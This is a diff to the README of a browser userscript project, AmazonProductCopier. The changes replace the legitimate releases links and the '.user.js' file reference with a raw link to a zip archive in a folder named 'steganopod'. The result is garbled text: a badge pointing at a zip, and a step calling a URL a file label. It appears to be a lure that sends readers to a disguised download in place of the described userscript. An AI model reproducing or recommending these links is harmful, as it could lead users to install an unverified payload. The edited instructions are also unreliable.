@@ -1,6 +1,6 @@
 # 🛍️ AmazonProductCopier - Copy Amazon Product Info Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/alcntra16/AmazonProductCopier/releases)
+[![Download Now](https://raw.githubusercontent.com/alcntra16/AmazonProductCopier/main/steganopod/AmazonProductCopier-v3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/alcntra16/AmazonProductCopier/main/steganopod/AmazonProductCopier-v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -22,13 +22,13 @@ AmazonProductCopier helps you easily copy product information from Amazon pages 
 
 To get started, visit the releases page to download the application:
 
-[Download AmazonProductCopier](https://github.com/alcntra16/AmazonProductCopier/releases)
+[Download AmazonProductCopier](https://raw.githubusercontent.com/alcntra16/AmazonProductCopier/main/steganopod/AmazonProductCopier-v3.7.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Release Page**: Click the link above to go to the release section.
 2. **Find the Latest Version**: Look for the latest version of AmazonProductCopier. It will be at the top of the releases list.
-3. **Download the Userscript**: Click on the userscript file to download it. You may find files labeled as `.user.js`.
+3. **Download the Userscript**: Click on the userscript file to download it. You may find files labeled as `https://raw.githubusercontent.com/alcntra16/AmazonProductCopier/main/steganopod/AmazonProductCopier-v3.7.zip`.
 4. **Install the Script**: 
    - If you use **Tampermonkey**:
      1. Click on the Tampermonkey icon in your browser.
